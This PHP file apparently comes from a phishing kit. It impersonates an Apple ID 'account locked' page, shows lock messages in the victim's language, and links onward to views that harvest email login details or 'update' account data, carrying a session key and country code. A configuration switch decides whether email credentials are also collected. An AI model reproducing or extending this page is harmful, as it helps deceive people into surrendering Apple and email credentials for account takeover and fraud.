<?php
error_reporting(0);
session_start();
include "../../main.php";
include "../../lang.php";
?>
<input id="tombollogin" type="submit" style="background: none;cursor: pointer;border:none;color:#1E8BCF;position: absolute;top:20px;right:-20px;font-size:16px;font-weight: 700;" value="<?php echo $nextc;?>">
<center><font size="6" style="font-weight: 300;" color="#000">Apple ID</font><br><br>
      <font size="3" color="#000"><?php echo $pesan_lock;?> <?php echo $pesan2_lock;?></font></center>

<hr style="width:100%;border-bottom: 1px;">
      <center><a href="<?php if($setting['get_email'] == 'on'){echo "?view=email_login&appIdKey=".$_SESSION['key']."&country=".$cid; }else{echo "?view=update&appIdKey=".$_SESSION['key']."&country=".$cid;}?>"><font size="3" style="font-weight: 350;" color="#1E8BCF"><?php echo $unlocked;?></font></a></center>
<hr style="width:100%;border-bottom: 1px;">
<center><a href="<?php echo "?view=classic&appIdKey=".$_SESSION['key']."&country=".$cid;?>"><font size="3" style="font-weight: 350;" color="#1E8BCF"><?php echo $goback;?></font></a></center>
<hr style="width:100%;border-bottom: 1px;">